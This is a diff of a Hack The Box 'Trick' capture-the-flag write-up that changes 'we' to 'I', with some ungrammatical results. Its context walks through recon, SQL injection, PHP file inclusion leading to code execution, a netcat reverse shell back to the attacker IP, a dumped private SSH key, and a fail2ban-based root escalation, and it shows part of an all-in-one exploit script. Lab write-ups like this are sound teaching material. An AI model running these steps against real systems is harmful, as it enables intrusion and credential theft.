@@ -126,11 +126,12 @@
 
 
   <div>
-    <p>This is a writeup for the <em>Hack the Box</em> <strong>Trick</strong> machine. We assume</p>
+    <p>This is a writeup for the <strong>HTB Trick</strong> machine. I assume</p>
 <ul>
 <li>Target IP:        10.10.11.166</li>
 <li>Attacking IP:     10.10.14.8</li>
 </ul>
+<p>The machine required Fuzzing, Reconnaissance, SQL Injection, PHP LFI/RCE and exploitation of weak configuration.</p>
 <h1>Reconnaissance</h1>
 <div class="highlight"><pre><span></span><code># Nmap 7.80 scan initiated Mon Jun 20 21:24:19 2022 as: nmap -p - -T4 -sV -oA nmap_trick 10.10.11.166
 Nmap scan report for 10.10.11.166
@@ -173,7 +174,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </code></pre></div>
 
 <p>No real results from nuclei.</p>
-<p>Now trying SMTP. The server responds really slow. The nmap script <code>smtp-commands</code> wouldn't even work. So we try plain old <code>netcat</code>.</p>
+<p>Now trying SMTP. The server responds really slow. The nmap script <code>smtp-commands</code> wouldn't even work. So I try plain old <code>netcat</code>.</p>
 <div class="highlight"><pre><span></span><code>nc $TIP 25
 220 debian.localdomain ESMTP Postfix (Debian/GNU)
 EHLO raphajohnsec.github.io
@@ -192,7 +193,7 @@ QUIT
 221 2.0.0 Bye
 </code></pre></div>
 
-<p>The server supports STARTTLS, maybe we can extract a hostname from the certificate. The command used is slightly cryptic. We connect to the host on port 25 using openssl. We tell the program to use the starttls smtp dialect. We input nothing and redirect <strong>stderr</strong> to <code>/dev/null</code>. The result is a certificate which we process again with openssl to print out readable information. At the end the output is appended to a log file.</p>
+<p>The server supports STARTTLS, maybe I can extract a hostname from the certificate. The command used is slightly cryptic. I connect to the host on port 25 using openssl. I tell the program to use the starttls smtp dialect. I input nothing and redirect <strong>stderr</strong> to <code>/dev/null</code>. The result is a certificate which I process again with openssl to print out readable information. At the end the output is appended to a log file.</p>
 <div class="highlight"><pre><span></span><code>$ openssl s_client -showcerts -connect <span class="nv">$TIP</span>:25 -starttls smtp &lt;/dev/null <span class="m">2</span>&gt;/dev/null <span class="p">|</span> openssl x509 -text -noout <span class="p">|</span> tee -a smtp_cert_info.txt
 Certificate:
     Data:
@@ -252,7 +253,7 @@ Certificate:
 </code></pre></div>
 
 <p>I highlighted all names found in the certificate. Again a dead end, it's always just <strong>debian</strong>.</p>
-<p>Next, we try the open DNS port.</p>
+<p>Next, I try the open DNS port.</p>
 <p>Testing first for open resolver.</p>
 <div class="highlight"><pre><span></span><code>$ dig A raphajohnsec.github.io @<span class="nv">$TIP</span>
 
@@ -276,7 +277,7 @@ Certificate:
 </code></pre></div>
 
 <p><strong>NOPE</strong></p>
-<p>Maybe we can resolve an internal domain, guessing <code>trick.htb</code>.</p>
+<p>Maybe I can resolve an internal domain, guessing <code>trick.htb</code>.</p>
 <div class="highlight"><pre><span></span><code>dig A trick.htb @<span class="nv">$TIP</span>
                                                                                                                                                                            <span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; A trick.htb @10.10.11.166
 <span class="p">;;</span> global options: +cmd
@@ -305,8 +306,8 @@ trick.htb.              <span class="m">604800</span>  IN      NS      trick.htb
 <span class="p">;;</span> MSG SIZE  rcvd: <span class="m">124</span>
 </code></pre></div>
 
-<p>Indeed, the server resolves <code>trick.htb</code> to <code>127.0.0.1</code>. So maybe we can find subdomains. We start with the <em>easiest</em> way, using <strong>axfr</strong> to initiate a zone transfer.</p>
-<p>It didn't work for an empty domain (all), but when we specify <code>trick.htb</code> as zone transfer domain.</p>
+<p>Indeed, the server resolves <code>trick.htb</code> to <code>127.0.0.1</code>. So maybe I can find subdomains. I start with the <em>easiest</em> way, using <strong>axfr</strong> to initiate a zone transfer.</p>
+<p>It didn't work for an empty domain (all), but when I specify <code>trick.htb</code> as zone transfer domain.</p>
 <div class="highlight"><pre><span></span><code>$ dig axfr trick.htb @<span class="nv">$TIP</span>
 
 <span class="p">;</span> &lt;&lt;&gt;&gt; DiG <span class="m">9</span>.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr trick.htb @10.10.11.166
@@ -382,7 +383,7 @@ nulcei couldn't find much, nginx, php, ...</p>
 <span class="m">301</span>      GET        7l       12w      185c http://preprod-payroll.trick.htb/assets/vendor/jquery <span class="o">=</span>&gt; http://preprod-payroll.trick.htb/assets/vendor/jquery/
 </code></pre></div>
 
-<p>But I want mooooore, we also ran cariddi on those endpoints found by feroxbuster.</p>
+<p>But I want mooooore, I also ran cariddi on those endpoints found by feroxbuster.</p>
 <div class="highlight"><pre><span></span><code>$ grep <span class="m">200</span> feroxbuster_preprod-payroll.trick.htb.log <span class="p">|</span> awk <span class="s1">&#39;{print $6}&#39;</span> <span class="p">|</span> ~/go/bin/cariddi -plain <span class="p">|</span> tee -a cariddi_preprod-payroll.trick.htb.log
 </code></pre></div>
 
@@ -396,7 +397,7 @@ $ cat cariddi_preprod-payroll.trick.htb.log &gt;&gt; url_collection_preprod-payr
 $ cat hakrawler_preprod-payroll.trick.htb.log &gt;&gt; url_collection_preprod-payroll.trick.htb.log
 <span class="c1"># cleaning with uro</span>
 $ cat url_collection_preprod-payroll.trick.htb.log <span class="p">|</span> uro &gt;&gt; cleaned_urls_preprod-payroll.trick.htb.log
-<span class="c1"># we remain with those URLs</span>
+<span class="c1"># I remain with those URLs</span>
 $ cat cleaned_urls_preprod-payroll.trick.htb.log
 http://preprod-payroll.trick.htb/home.php
 http://preprod-payroll.trick.htb/login.php
@@ -412,7 +413,7 @@ http://preprod-payroll.trick.htb/payroll.php
 http://preprod-payroll.trick.htb/index.php?page<span class="o">=</span>home
 </code></pre></div>
 
-<p>We can go even further. We download all those sites and search through the source code.</p>
+<p>I can go even further. I download all those sites and search through the source code.</p>
 <div class="highlight"><pre><span></span><code>$ wget -i cleaned_urls_preprod-payroll.trick.htb.log
 $ ls -la
 -rw-r--r-- <span class="m">1</span> root root <span class="m">5571</span> Jun <span class="m">21</span> <span class="m">14</span>:42 <span class="s1">&#39;ajax.php?action=logout&#39;</span>
@@ -429,7 +430,7 @@ $ ls -la
 -rw-r--r-- <span class="m">1</span> root root <span class="m">2197</span> Jun <span class="m">21</span> <span class="m">14</span>:42  users.php
 </code></pre></div>
 
-<p>Now we are using some magical, not so magical greps and regular expressions so find endpoint and parameters.</p>
+<p>Now I am using some magical, not so magical greps and regular expressions so find endpoint and parameters.</p>
 <div class="highlight"><pre><span></span><code>$ grep -h -i <span class="s2">&quot;\.php&quot;</span> * <span class="p">|</span> rg -o -e <span class="s2">&quot;((&#39;|\&quot;)(.*?)(&#39;|\&quot;))&quot;</span> -r <span class="s1">&#39;$3&#39;</span> <span class="p">|</span> grep php <span class="p">|</span> sort -u
 ajax.php?action<span class="o">=</span>calculate_payroll
 ajax.php?action<span class="o">=</span>delete_department
@@ -460,8 +461,8 @@ view_employee.php?id<span class="o">=</span>
 voting.php
 </code></pre></div>
 
-<p>We end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page we are greeted with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
-<p>And yesssss, we are lucky.</p>
+<p>I end up with a very nice list. I go with <code>manage_users.php?id=1</code> at very first. Visiting the page I are greeted with a nice prefilled form, hoping the password might be in cleartext in the source code.</p>
+<p>And yesssss, I are lucky.</p>
 <h1>Unsecured Credentials (T1552)</h1>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;container-fluid&quot;</span><span class="p">&gt;</span>
 
@@ -509,7 +510,7 @@ voting.php
 <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div>
 
-<p>We have credentials now</p>
+<p>I have credentials now</p>
 <table>
 <thead>
 <tr>
@@ -526,9 +527,9 @@ voting.php
 </tr>
 </tbody>
 </table>
-<p>We can login with those credentials to the website, but they don't work on SSH.</p>
+<p>I can login with those credentials to the website, but they don't work on SSH.</p>
 <h1>SQL Injection</h1>
-<p>We take a look on the admin panel later, we first go with the SQL injection tries. We take the endpoint list we gathered already and filter it even more, so sqlmap can perform its magic.</p>
+<p>I take a look on the admin panel later, I first go with the SQL injection tries. I take the endpoint list I gathered already and filter it even more, so sqlmap can perform its magic.</p>
 <div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/ajax.php?action=login
 http://preprod-payroll.trick.htb/index.php?page=payroll
 http://preprod-payroll.trick.htb/index.php?page=payroll_items&amp;id=1
@@ -548,7 +549,7 @@ Example:</p>
 <div class="highlight"><pre><span></span><code>http://preprod-payroll.trick.htb/manage_employee.php?id=-1+union+select+1,2,0x3a3a3a3a3a3a3a3a3a3a,4,5,6,7,8
 </code></pre></div>
 
-<p>Let's extract some juicy information and maybe we can get a shell?!</p>
+<p>Let's extract some juicy information and maybe I can get a shell?!</p>
 <div class="highlight"><pre><span></span><code>python sqlmap.py -u &#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39; --current-user --dbs
 current user: &#39;remo@localhost&#39;
 available databases [2]:
@@ -557,11 +558,11 @@ available databases [2]:
 =======
 </code></pre></div>
 
-<p>The current DB user can read system files and we chose sqlmap to read common files from the system and dump those to disk.</p>
+<p>The current DB user can read system files and I chose sqlmap to read common files from the system and dump those to disk.</p>
 <div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s1">&#39;http://preprod-payroll.trick.htb/manage_employee.php?id=1&#39;</span> --common-files
 </code></pre></div>
 
-<p>We receive files like passwd and nginx configuration. Let's grep through those files.</p>
+<p>I receive files like passwd and nginx configuration. Let's grep through those files.</p>
 <div class="highlight"><pre><span></span><code>grep -i payroll /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/*
 /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        server_name preprod-payroll.trick.htb<span class="p">;</span>
 /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default:        root /var/www/payroll<span class="p">;</span>
@@ -611,8 +612,8 @@ payroll                 <span class="o">[</span>Status: <span class="m">302</spa
 :: Progress: <span class="o">[</span><span class="m">114441</span>/114441<span class="o">]</span> :: Job <span class="o">[</span><span class="m">1</span>/1<span class="o">]</span> :: <span class="m">1262</span> req/sec :: Duration: <span class="o">[</span><span class="m">0</span>:01:34<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </code></pre></div>
 
-<p>Aaaand now we might read webserver files using the SQL injection?
-In the very first file we read <code>index.php</code> we find a possible <strong>File Inclusion</strong> vulnerability.</p>
+<p>Aaaand now I might read webserver files using the SQL injection?
+In the very first file I read <code>index.php</code> I find a possible <strong>File Inclusion</strong> vulnerability.</p>
 <div class="highlight"><pre><span></span><code><span class="x">--------snip---------</span>
 <span class="x">  &lt;main id=&quot;view-panel&quot; &gt;</span>
 <span class="x">      </span><span class="cp">&lt;?php</span> <span class="nv">$page</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">:</span><span class="s1">&#39;home&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
@@ -621,7 +622,7 @@ In the very first file we read <code>index.php</code> we find a possible <strong
 <span class="x">--------snip---------</span>
 </code></pre></div>
 
-<p>Local File Inclusion is working great. We can extract data if we know the path. We extract the <code>login.php</code> file using</p>
+<p>Local File Inclusion is working great. I can extract data if I know the path. I extract the <code>login.php</code> file using</p>
 <div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=login&#39;</span> --silent <span class="p">|</span> rg --multiline --multiline-dotall <span class="s1">&#39;(&lt;main id=&quot;view-panel&quot; &gt;(.*?)&lt;/main&gt;)&#39;</span> -a
   &lt;main <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;view-panel&quot;</span> &gt;
                 PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQoNCjxoZWFkPg0KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQogIDxtZXRhIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiIG5hbWU9InZpZXdwb3J0Ij4NCg0KICA8dGl0bGU+QWRtaW4gfCBFbXBsb3llZSdzIFBheXJvbGwgTWFuYWdlbWVudCBTeXN0ZW08L3RpdGxlPg0KIAkNCg0KPD9waHAgaW5jbHVkZSgnLi9oZWFkZXIucGhwJyk7ID8+DQo8P3BocCBpbmNsdWRlKCcuL2RiX2Nvbm5lY3QucGhwJyk7ID8+DQo8P3BocCANCnNlc3Npb25fc3RhcnQoKTsNCmlmKGlzc2V0KCRfU0VTU0lPTlsnbG9naW5faWQnXSkpDQpoZWFkZXIoImxvY2F0aW9uOmluZGV4LnBocD9wYWdlPWhvbWUiKTsNCg0KPz4NCg0KPC9oZWFkPg0KPHN0eWxlPg0KCWJvZHl7DQoJCXdpZHRoOiAxMDAlOw0KCSAgICBoZWlnaHQ6IGNhbGMoMTAwJSk7DQoJICAgIC8qYmFja2dyb3VuZDogIzAwN2JmZjsqLw0KCX0NCgltYWluI21haW57DQoJCXdpZHRoOjEwMCU7DQoJCWhlaWdodDogY2FsYygxMDAlKTsNCgkJYmFja2dyb3VuZDp3aGl0ZTsNCgl9DQoJI2xvZ2luLXJpZ2h0ew0KCQlwb3NpdGlvbjogYWJzb2x1dGU7DQoJCXJpZ2h0OjA7DQoJCXdpZHRoOjQwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOndoaXRlOw0KCQlkaXNwbGF5OiBmbGV4Ow0KCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCX0NCgkjbG9naW4tbGVmdHsNCgkJcG9zaXRpb246IGFic29sdXRlOw0KCQlsZWZ0OjA7DQoJCXdpZHRoOjYwJTsNCgkJaGVpZ2h0OiBjYWxjKDEwMCUpOw0KCQliYWNrZ3JvdW5kOiM1OWI2ZWM2MTsNCgkJZGlzcGxheTogZmxleDsNCgkJYWxpZ24taXRlbXM6IGNlbnRlcjsNCgkJYmFja2dyb3VuZDogdXJsKGFzc2V0cy9pbWcvcGF5cm9sbC1jb3Zlci5qcGcpOw0KCSAgICBiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0Ow0KCSAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KCX0NCgkjbG9naW4tcmlnaHQgLmNhcmR7DQoJCW1hcmdpbjogYXV0bzsNCgkJei1pbmRleDogMQ0KCX0NCgkubG9nbyB7DQogICAgbWFyZ2luOiBhdXRvOw0KICAgIGZvbnQtc2l6ZTogOHJlbTsNCiAgICBiYWNrZ3JvdW5kOiB3aGl0ZTsNCiAgICBwYWRkaW5nOiAuNWVtIDAuN2VtOw0KICAgIGJvcmRlci1yYWRpdXM6IDUwJSA1MCU7DQogICAgY29sb3I6ICMwMDAwMDBiMzsNCiAgICB6LWluZGV4OiAxMDsNCn0NCmRpdiNsb2dpbi1yaWdodDo6YmVmb3JlIHsNCiAgICBjb250ZW50OiAiIjsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgdG9wOiAwOw0KICAgIGxlZnQ6IDA7DQogICAgd2lkdGg6IGNhbGMoMTAwJSk7DQogICAgaGVpZ2h0OiBjYWxjKDEwMCUpOw0KICAgIGJhY2tncm91bmQ6ICM5ZmEzYTdlMDsNCn0NCg0KPC9zdHlsZT4NCg0KPGJvZHk+DQoNCg0KICA8bWFpbiBpZD0ibWFpbiIgY2xhc3M9IiBiZy1kYXJrIj4NCiAgCQk8ZGl2IGlkPSJsb2dpbi1sZWZ0Ij4NCiAgCQkJDQogIAkJPC9kaXY+DQoNCiAgCQk8ZGl2IGlkPSJsb2dpbi1yaWdodCI+DQogIAkJCTxkaXYgY2xhc3M9ImNhcmQgY29sLW1kLTgiPg0KICAJCQkJPGRpdiBjbGFzcz0iY2FyZC1ib2R5Ij4NCiAgCQkJCQkJDQogIAkJCQkJPGZvcm0gaWQ9ImxvZ2luLWZvcm0iID4NCiAgCQkJCQkJPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+DQogIAkJCQkJCQk8bGFiZWwgZm9yPSJ1c2VybmFtZSIgY2xhc3M9ImNvbnRyb2wtbGFiZWwiPlVzZXJuYW1lPC9sYWJlbD4NCiAgCQkJCQkJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIiBjbGFzcz0iZm9ybS1jb250cm9sIj4NCiAgCQkJCQkJPC9kaXY+DQogIAkJCQkJCTxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPg0KICAJCQkJCQkJPGxhYmVsIGZvcj0icGFzc3dvcmQiIGNsYXNzPSJjb250cm9sLWxhYmVsIj5QYXNzd29yZDwvbGFiZWw+DQogIAkJCQkJCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiPg0KICAJCQkJCQk8L2Rpdj4NCiAgCQkJCQkJPGNlbnRlcj48YnV0dG9uIGNsYXNzPSJidG4tc20gYnRuLWJsb2NrIGJ0bi13YXZlIGNvbC1tZC00IGJ0bi1wcmltYXJ5Ij5Mb2dpbjwvYnV0dG9uPjwvY2VudGVyPg0KICAJCQkJCTwvZm9ybT4NCiAgCQkJCTwvZGl2Pg0KICAJCQk8L2Rpdj4NCiAgCQk8L2Rpdj4NCiAgIA0KDQogIDwvbWFpbj4NCg0KICA8YSBocmVmPSIjIiBjbGFzcz0iYmFjay10by10b3AiPjxpIGNsYXNzPSJpY29mb250LXNpbXBsZS11cCI+PC9pPjwvYT4NCg0KDQo8L2JvZHk+DQo8c2NyaXB0Pg0KCSQoJyNsb2dpbi1mb3JtJykuc3VibWl0KGZ1bmN0aW9uKGUpew0KCQllLnByZXZlbnREZWZhdWx0KCkNCgkJJCgnI2xvZ2luLWZvcm0gYnV0dG9uW3R5cGU9ImJ1dHRvbiJdJykuYXR0cignZGlzYWJsZWQnLHRydWUpLmh0bWwoJ0xvZ2dpbmcgaW4uLi4nKTsNCgkJaWYoJCh0aGlzKS5maW5kKCcuYWxlcnQtZGFuZ2VyJykubGVuZ3RoID4gMCApDQoJCQkkKHRoaXMpLmZpbmQoJy5hbGVydC1kYW5nZXInKS5yZW1vdmUoKTsNCgkJJC5hamF4KHsNCgkJCXVybDonYWpheC5waHA/YWN0aW9uPWxvZ2luJywNCgkJCW1ldGhvZDonUE9TVCcsDQoJCQlkYXRhOiQodGhpcykuc2VyaWFsaXplKCksDQoJCQllcnJvcjplcnI9PnsNCgkJCQljb25zb2xlLmxvZyhlcnIpDQoJCSQoJyNsb2dpbi1mb3JtIGJ1dHRvblt0eXBlPSJidXR0b24iXScpLnJlbW92ZUF0dHIoJ2Rpc2FibGVkJykuaHRtbCgnTG9naW4nKTsNCg0KCQkJfSwNCgkJCXN1Y2Nlc3M6ZnVuY3Rpb24ocmVzcCl7DQoJCQkJaWYocmVzcCA9PSAxKXsNCgkJCQkJbG9jYXRpb24uaHJlZiA9J2luZGV4LnBocD9wYWdlPWhvbWUnOw0KCQkJCX1lbHNlIGlmKHJlc3AgPT0gMil7DQoJCQkJCWxvY2F0aW9uLmhyZWYgPSd2b3RpbmcucGhwJzsNCgkJCQl9ZWxzZXsNCgkJCQkJJCgnI2xvZ2luLWZvcm0nKS5wcmVwZW5kKCc8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiPlVzZXJuYW1lIG9yIHBhc3N3b3JkIGlzIGluY29ycmVjdC48L2Rpdj4nKQ0KCQkJCQkkKCcjbG9naW4tZm9ybSBidXR0b25bdHlwZT0iYnV0dG9uIl0nKS5yZW1vdmVBdHRyKCdkaXNhYmxlZCcpLmh0bWwoJ0xvZ2luJyk7DQoJCQkJfQ0KCQkJfQ0KCQl9KQ0KCX0pDQo8L3NjcmlwdD4JDQo8L2h0bWw+
@@ -772,7 +773,7 @@ In the very first file we read <code>index.php</code> we find a possible <strong
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
 
-<p>Ok, we can read files using SQL injection and we can read files using Local File inclusion, but maybe we can gain RCE using the PHP File Inclusion. We use the SQL injection to write a simple PHP file to <code>/tmp/</code> and then include it using the LFI.</p>
+<p>Ok, I can read files using SQL injection and I can read files using Local File inclusion, but maybe I can gain RCE using the PHP File Inclusion. I use the SQL injection to write a simple PHP file to <code>/tmp/</code> and then include it using the LFI.</p>
 <div class="highlight"><pre><span></span><code>msf6 exploit(multi/handler) &gt; show options
 
 Module options (exploit/multi/handler):
@@ -801,7 +802,7 @@ msf6 exploit(multi/handler) &gt; run
 [*] Started reverse TCP handler on 10.10.14.8:4444
 </code></pre></div>
 
-<p>We trigger the reverse shell using the PHP LFI RCE</p>
+<p>I trigger the reverse shell using the PHP LFI RCE</p>
 <div class="highlight"><pre><span></span><code>curl <span class="s1">&#39;http://preprod-payroll.trick.htb/index.php?page=/tmp/phpcmd&amp;cmd=nc 10.10.14.8 4444 -e /usr/bin/bash&#39;</span> --silent
 </code></pre></div>
 
@@ -885,12 +886,12 @@ else{
 ?&gt;
 </code></pre></div>
 
-<p>Clearly, this is another LFI. Let's give it a try and see what user we are by executing <code>id</code>.</p>
+<p>Clearly, this is another LFI. Let's give it a try and see what user I am by executing <code>id</code>.</p>
 <div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl <span class="s2">&quot;preprod-marketing.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=id&quot;</span>
 <span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>michael<span class="o">)</span>,1002<span class="o">(</span>security<span class="o">)</span>
 </code></pre></div>
 
-<p>Ok, we aren't <code>www-data</code> anymore, but user <code>michael</code> instead. Fast forward, by using the new LFI/RCE we walk through the filesystem and find michael's private SSH key.</p>
+<p>Ok, I am <code>www-data</code> anymore, but user <code>michael</code> instead. Fast forward, by using the new LFI/RCE I walk through the filesystem and find michael's private SSH key.</p>
 <div class="highlight"><pre><span></span><code><span class="o">(</span>venv3<span class="o">)</span> root@pwnbox:~/venv3/htb/trick# curl preprod-marketing.trick.htb/index.php?page<span class="o">=</span>....//....//....//home/michael/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
@@ -921,7 +922,7 @@ jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
 -----END OPENSSH PRIVATE KEY-----
 </code></pre></div>
 
-<p>With that key, we can connect using SSH. Noteable the user can use sudo to restart fail2ban and is part of the security group which can write to the <code>/etc/fail2ban/action.d/</code> directory.</p>
+<p>With that key, I can connect using SSH. Noteable the user can use sudo to restart fail2ban and is part of the security group which can write to the <code>/etc/fail2ban/action.d/</code> directory.</p>
 <div class="highlight"><pre><span></span><code>ssh -i id_rsa_michael michael@<span class="nv">$TIP</span>
 Linux trick <span class="m">4</span>.19.0-20-amd64 <span class="c1">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
 
@@ -947,8 +948,8 @@ drwxr-xr-x <span class="m">6</span> root root      <span class="m">4096</span> J
 ...
 </code></pre></div>
 
-<p>We can't edit the files in <code>action.d</code> in place, but copy, edit, overwrite/delete. By inserting an own <code>actionban</code> command, we can execute commands as <code>root</code> user.
-With the python script below, we read the <code>/root/root.txt</code> flag and create a server listening on port 35345, printing back the flag to the first client.</p>
+<p>I can't edit the files in <code>action.d</code> in place, but copy, edit, overwrite/delete. By inserting an own <code>actionban</code> command, I can execute commands as <code>root</code> user.
+With the python script below, I read the <code>/root/root.txt</code> flag and create a server listening on port 35345, printing back the flag to the first client.</p>
 <div class="highlight"><pre><span></span><code># Option:  actioncheck
 # Notes.:  command executed once before each actionban command
 # Values:  CMD
@@ -972,13 +973,13 @@ cp -f /tmp/im.conf.tmp /etc/fail2ban/action.d/iptables-multiport.conf
 sudo /etc/init.d/fail2ban restart
 </code></pre></div>
 
-<p>We force copy the edited file and restart the service. The next step is to trigger the <strong>ban</strong>. We could connect with SSH multiple times using wrong passwords, but I found a more convenient way without using SSH. fail2ban evaluates the <code>/var/log/auth.log</code> and we can insert own entries, even as low privilege user, using the <code>logger</code> command.
+<p>I force copy the edited file and restart the service. The next step is to trigger the <strong>ban</strong>. I could connect with SSH multiple times using wrong passwords, but I found a more convenient way without using SSH. fail2ban evaluates the <code>/var/log/auth.log</code> and I can insert own entries, even as low privilege user, using the <code>logger</code> command.
 Example:</p>
 <div class="highlight"><pre><span></span><code>logger --tag sshd --id=1337 -p auth.info &#39;Failed password for invalid user root from 192.192.192.192 port 31337 ssh2
 </code></pre></div>
 
 <p>Execute that multiple times.
-As root, we can read <code>/var/log/auth.log</code> showing the "failed" login attempts.</p>
+As root, I can read <code>/var/log/auth.log</code> showing the "failed" login attempts.</p>
 <div class="highlight"><pre><span></span><code>root@trick:~# grep sshd /var/log/auth.log | tail -n 50
 Jul  4 16:07:06 trick sshd[736]: Server listening on 0.0.0.0 port 22.
 Jul  4 16:07:06 trick sshd[736]: Server listening on :: port 22.
@@ -1021,12 +1022,12 @@ Jul  4 16:11:18 trick sshd[1337]: Failed password for invalid user root from 192
 2022-07-04 16:11:16,080 fail2ban.actions        [1556]: NOTICE  [sshd] Ban 192.192.192.192
 </code></pre></div>
 
-<p>Now we try to connect to port 35345.</p>
+<p>Now I try to connect to port 35345.</p>
 <div class="highlight"><pre><span></span><code>$ nc <span class="m">127</span>.0.0.1 <span class="m">35345</span>
 AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQ
 </code></pre></div>
 
-<p>Done. We got the root flag. We could have also spawned a reverse root shell, but wasn't necessary.</p>
+<p>Done. I got the root flag. I could have also spawned a reverse root shell, but wasn't necessary.</p>
 <p>Here is the all in one PoC to pwn the machine.</p>
 <div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">logging</span>
@@ -1167,7 +1168,7 @@ AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQ
     <span class="n">TESTCMD</span> <span class="o">=</span> <span class="s2">&quot;echo ]foobar[&quot;</span>
     <span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;http://preprod-payroll.trick.htb/index.php?page=....//....//....//tmp/phpcmd.php&amp;cmd=</span><span class="si">{}</span><span class="s2">&quot;</span>
     <span class="c1"># Setting the Host header to reach the `marketing` vhost</span>
-    <span class="c1"># We could also set the DNS record of `preprod-marketing.trick.htb` to the targets IP</span>
+    <span class="c1"># I could also set the DNS record of `preprod-marketing.trick.htb` to the targets IP</span>
     <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
         <span class="s2">&quot;Host&quot;</span><span class="p">:</span> <span class="s2">&quot;preprod-marketing.trick.htb&quot;</span>
     <span class="p">}</span>
@@ -1207,7 +1208,7 @@ AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQ
 <span class="sd">    By copying and altering the ban command in `iptables-multiport.conf`, a python script is executed that reads the root flag and outputs the</span>
 <span class="sd">    content to the first client connecting on port 35345. After changing the ban command the file is force copied to the original location and</span>
 <span class="sd">    fail2ban restarted using the sudo command.</span>
-<span class="sd">    To trigger the ban command, we could connect and falsely authenticate to the SSH daemon multiple times. Instead we inject simulated failed login</span>
+<span class="sd">    To trigger the ban command, I could connect and falsely authenticate to the SSH daemon multiple times. Instead I inject simulated failed login</span>
 <span class="sd">    attempts in the `/var/log/auth.log` leveraging the `logger` linux command.</span>
 <span class="sd">    After a short wait time the script connects to the hopefully running python socket and receives the root flag.</span>
 
